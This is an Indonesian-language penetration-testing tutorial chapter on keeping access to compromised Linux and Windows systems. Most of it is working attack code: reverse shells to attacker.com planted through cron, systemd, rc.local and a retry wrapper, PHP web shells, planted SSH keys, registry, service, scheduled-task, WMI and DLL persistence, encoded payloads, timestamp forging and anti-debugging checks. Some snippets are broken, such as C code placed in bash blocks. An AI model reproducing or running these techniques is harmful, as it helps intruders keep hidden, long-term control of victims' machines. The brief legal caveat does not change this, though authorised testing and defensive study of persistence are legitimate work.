# 3.3 Persistence Mechanisms

Persistence mechanism adalah teknik untuk mempertahankan akses ke sistem yang telah dikompromikan meskipun sistem di-reboot atau account diubah. Ini penting untuk long-term access dan maintain foothold di target network.

## Macam-macam Persistence Techniques

1. **Boot Persistence** - Bertahan setelah reboot
2. **User-based Persistence** - Bertahan saat user login
3. **Service-based Persistence** - Berjalan sebagai service
4. **Application-based Persistence** - Menggunakan aplikasi legitimate
5. **Covert Persistence** - Tersembunyi dan sulit dideteksi

## Linux Persistence Mechanisms

### 1. Cron Job Persistence

Cron jobs adalah scheduled tasks yang berjalan otomatis pada waktu tertentu.

#### Persistent Cron Job:

```bash
# Edit crontab
crontab -e

# Add reverse shell yang berjalan setiap menit
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Atau setiap 5 menit
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Atau saat reboot
@reboot /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Check cron job
crontab -l
```

#### System-wide Cron Persistence:

```bash
# Add to system crontab (requires root)
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" >> /etc/crontab

# Add to cron.daily untuk execute sekali sehari
echo '/bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' >> /etc/cron.daily/backdoor

# Make executable
chmod +x /etc/cron.daily/backdoor
```

#### Stealthy Cron Persistence:

```bash
# Hide dalam legitimate cron job
# Edit existing cron job:
# 0 2 * * * /usr/local/bin/backup.sh
# Menjadi:
# 0 2 * * * /usr/local/bin/backup.sh && /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Atau embed dalam script yang sudah ada
echo '#!/bin/bash' > /usr/local/bin/cleanup.sh
echo '# Legitimate cleanup script' >> /usr/local/bin/cleanup.sh
echo 'rm -rf /tmp/*' >> /usr/local/bin/cleanup.sh
echo '/bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &' >> /usr/local/bin/cleanup.sh
chmod +x /usr/local/bin/cleanup.sh
```

### 2. SSH Key Persistence

SSH keys menyediakan akses yang lebih stealth daripada password.

#### SSH Key Generation dan Deployment:

```bash
# Generate key pair pada attacker
ssh-keygen -t rsa -b 4096 -C "backup@company.com"
# Tekan enter untuk semua prompt

# Copy public key ke target
ssh-copy-id -i ~/.ssh/id_rsa.pub user@target

# Atau manual jika ssh-copy-key tidak available
cat ~/.ssh/id_rsa.pub | ssh user@target "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

# Test access
ssh -i ~/.ssh/id_rsa user@target
```

#### Root SSH Key Persistence:

```bash
# Setelah dapat akses root
mkdir -p /root/.ssh
chmod 700 /root/.ssh

# Add public key
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Verify
ssh root@target
```

#### Hidden SSH Keys:

```bash
# Hide SSH key dalam lokasi tidak biasa
mkdir -p /var/lib/.ssh
cat id_rsa.pub > /var/lib/.ssh/authorized_keys

# Modify SSHD config untuk mengizinkan alternative key location
echo "AuthorizedKeysFile .ssh/authorized_keys /var/lib/.ssh/authorized_keys" >> /etc/ssh/sshd_config
systemctl restart sshd
```

### 3. Systemd Service Persistence

Systemd services lebih modern dan sulit terdeteksi.

#### Systemd Service Creation:

```bash
# Create service file
sudo cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
Restart=always
RestartSec=10
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

# Enable dan start service
sudo systemctl enable backdoor.service
sudo systemctl start backdoor.service

# Check status
sudo systemctl status backdoor.service
```

#### Hidden Systemd Service:

```bash
# Buat service dengan nama yang legitimate
sudo cat > /etc/systemd/system/network-monitor.service << EOF
[Unit]
Description=Network Interface Monitor
After=network.target

[Service]
ExecStart=/bin/bash -c 'while true; do sleep 300; bash -i >& /dev/tcp/attacker.com/4444 0>&1; done'
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable network-monitor.service
```

### 4. Web Shell Persistence

Web shell sangat efektif untuk web servers.

#### PHP Web Shell:

```php
<?php
// Hidden dalam legitimate file
if(isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
}
?>

// Atau yang lebih stealth
<?php
// Maintenance check script
if($_SERVER['REMOTE_ADDR'] == '192.168.1.100') {
    if(isset($_REQUEST['debug'])) {
        system($_REQUEST['debug']);
    }
}
?>
```

#### File Upload Web Shell:

```bash
# Create sophisticated web shell
cat > /var/www/html/upload.php << EOF
<?php
if(isset($_FILES['file'])){
    $file = $_FILES['file']['name'];
    $tmp = $_FILES['file']['tmp_name'];
    move_uploaded_file($tmp, $file);
    echo "Uploaded: $file";
}
?>
<form method="post" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit" value="Upload">
</form>
EOF
```

### 5. Reverse Shell Wrapper

Wrapper script yang menyediakan multiple connection attempts.

```bash
#!/bin/bash
# persistent.sh - Multi-host reverse shell wrapper

TARGETS=(
    "attacker.com:4444"
    "backup.attacker.com:4444"
    "192.168.1.100:4444"
)

while true; do
    for target in "${TARGETS[@]}"; do
        host=$(echo $target | cut -d: -f1)
        port=$(echo $target | cut -d: -f2)

        # Try to connect
        bash -i >& /dev/tcp/$host/$port 0>&1 &
        PID=$!
        sleep 5
        kill $PID 2>/dev/null
    done
    sleep 300  # Wait 5 minutes before retry
done

# Install
chmod +x persistent.sh
echo "* * * * * /path/to/persistent.sh" | crontab -
```

## Windows Persistence Mechanisms

### 1. Registry Persistence

Registry adalah tempat yang umum untuk persistence pada Windows.

#### Run Registry Keys:

```cmd
# Current user Run key (low privilege)
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\temp\update.exe"

# System Run key (requires admin)
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Security" /t REG_SZ /d "C:\Windows\System32\security.exe"

# RunOnce (execute sekali setelah reboot)
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "C:\temp\setup.exe"

# Check existing entries
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

#### Logon Scripts:

```cmd
# Add logon script via registry
reg add "HKEY_CURRENT_USER\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\temp\logon.bat"

# Create logon script
echo @echo off > C:\temp\logon.bat
echo powershell -enc <base64_payload> >> C:\temp\logon.bat

# System-wide logon script
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Logon\0" /v "Script" /t REG_SZ /d "C:\Windows\System32\logon.exe"
```

### 2. Service Persistence

Windows services memiliki tingkat persistence yang tinggi.

#### Create New Service:

```cmd
# Create service
sc create "Windows Monitoring" binpath= "C:\Windows\System32\monitor.exe" start= auto
sc description "Windows Monitoring" "Monitors system performance"

# Configure failure actions untuk auto-restart
sc failure "Windows Monitoring" reset= 86400 command= "C:\temp\recover.exe" actions= restart/5000/restart/10000/restart/20000

# Start service
sc start "Windows Monitoring"
```

#### Modify Existing Service:

```cmd
# Find service yang jarang digunakan
sc query state= inactive

# Modify service binary path
sc config "Print Spooler" start= auto
sc config "Print Spooler" binpath= "C:\temp\malicious.exe"
```

### 3. Scheduled Task Persistence

Scheduled tasks sangat fleksibel dan bisa diatur untuk berbagai trigger.

#### Create Scheduled Task:

```cmd
# Create task yang berjalan pada login
schtasks /create /tn "Windows Security" /tr "C:\Windows\System32\security.exe" /sc onlogon

# Create task dengan trigger event
schtasks /create /tn "Maintenance" /tr "C:\temp\maint.exe" /sc onevent /EC Application /MO *[System/EventID=1024]

# Hidden task dengan trigger waktu
schtasks /create /tn "Update" /tr "C:\temp\update.exe" /sc daily /st 09:00 /ru System /rl highest

# Create task dengan trigger idle
schtasks /create /tn "Cleanup" /tr "C:\temp\cleanup.exe" /sc onidle /i 30
```

#### Advanced Scheduled Task:

```powershell
# PowerShell untuk create sophisticated task
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -EncodedCommand <base64>"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
Register-ScheduledTask -TaskName "System Health" -Action $Action -Trigger $Trigger -Settings $Settings -RunLevel Highest
```

### 4. WMI Persistence

WMI persistence sangat stealth dan sulit dideteksi.

#### WMI Event Consumer:

```powershell
# Create WMI event consumer untuk persistence
$EventConsumer = Set-WmiEventConsumer -Name "CommandLineEventConsumer" -CommandLineTemplate "C:\Windows\System32\wmi.exe"

# Create event filter
$EventFilter = Set-WmiEventFilter -Name "SystemUpdate" -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'" -EventNamespace root\cimv2

# Bind filter ke consumer
Set-WmiEventFilterToConsumerBinding -Filter $EventFilter -Consumer $EventConsumer
```

#### Permanent WMI Subscription:

```powershell
# Permanent WMI subscription yang bertahan setelah reboot
$namespace = "root\subscription"
$consumerName = "MaintenanceConsumer"
$filterName = "MaintenanceFilter"

# Consumer script yang akan dijalankan
$script = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -EncodedCommand <base64>'

# Create permanent consumer
Set-WmiInstance -Class __EventConsumer -Namespace $namespace -Arguments @{
    Name = $consumerName;
    CommandLineTemplate = $script
}

# Create filter untuk trigger
Set-WmiInstance -Class __EventFilter -Namespace $namespace -Arguments @{
    Name = $filterName;
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'";
    EventNameSpace = "root\cimv2"
}
```

### 5. DLL Persistence

DLL hijacking untuk persistence.

#### AppInit_DLLs:

```cmd
# Enable AppInit_DLLs
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "AppInit_DLLs" /t REG_SZ /d "C:\Windows\System32\legit.dll"

# Verify
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "AppInit_DLLs"
```

#### Print Monitor DLL:

```cmd
# Create malicious print monitor
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors\MaliciousMonitor" /v "Driver" /t REG_SZ /d "C:\Windows\System32\malicious.dll"
```

## Covert Persistence Techniques

### 1. Hidden Files and Directories

```bash
# Create hidden directory dengan nama tidak mencurigakan
mkdir /var/tmp/.cache
chmod 700 /var/tmp/.cache

# Hide files di dalam hidden directory
cat > /var/tmp/.cache/.systemd << EOF
#!/bin/bash
# System cache manager
/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
EOF

# Make executable
chmod +x /var/tmp/.cache/.systemd

# Trigger melalui legitimate process
echo "/var/tmp/.cache/.systemd &" >> /etc/rc.local
```

### 2. File Timestamp Manipulation

```bash
# Copy timestamp dari legitimate file
stat /etc/passwd

# Set same timestamp untuk malicious file
touch -r /etc/passwd /tmp/backdoor.sh
```

### 3. Rootkit Techniques

```bash
# Loadable kernel module (advanced)
# Contoh sederhana kernel module untuk persistence
cat > backdoor.c << EOF
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static int __init backdoor_init(void) {
    printk(KERN_INFO "Loading legitimate module\n");
    // Hide our processes
    return 0;
}

static void __exit backdoor_exit(void) {
    printk(KERN_INFO "Unloading module\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);
EOF

# Compile dan load module
make
insmod backdoor.ko
```

## Detection Avoidance

### 1. Anti-Analysis Techniques

```bash
# Check untuk debugging
if ptrace(PTRACE_TRACEME, 0, 1, 0) < 0 {
    // Exit jika sedang di-debug
    exit(1);
}

# Check untuk virtualization
if (access("/proc/vz", F_OK) != -1) {
    // OpenVZ detected
    exit(1);
}
```

### 2. Encoded Payloads

```bash
# Encode payload dengan base64 untuk menghindar detection
payload=$(echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' | base64 -w0)

# Use dalam cron job
echo "echo $payload | base64 -d | bash" | crontab -
```

### 3. Time-based Evasion

```bash
# Random delays untuk menghindar pattern detection
#!/bin/bash
delay=$((RANDOM % 3600))  # Random delay up to 1 hour
sleep $delay
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

## Persistence Cleanup

### Saat selesai testing:

```bash
# Linux
crontab -r  # Remove semua cron jobs
rm -f /etc/cron.d/*  # Remove system cron jobs
systemctl disable backdoor.service  # Disable systemd service
rm -rf /root/.ssh/authorized_keys  # Remove SSH keys

# Windows
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousValue"
schtasks /delete /tn "MaliciousTask" /f
sc delete "MaliciousService"
```

## Best Practices

1. **Multiple Persistence Methods** - Gunakan minimal 2-3 methods
2. **Legitimate Naming** - Gunakan nama yang tidak mencurigakan
3. **Fail-safe** - Pastikan ada fallback connection
4. **Covert Channels** - Gunakan communication channels yang tidak mencurigakan
5. **Regular Testing** - Test persistence methods secara berkala

## Important Notes

1. **Legal Considerations** - Hanya gunakan di authorized systems
2. **Detection Risk** - Semakin banyak persistence, semakin besar risiko terdeteksi
3. **System Stability** - Beberapa methods bisa mempengaruhi system stability
4. **Documentation** - Document semua persistence methods yang digunakan
5. **Cleanup Plan** - Selalu ada plan untuk remove semua persistence mechanisms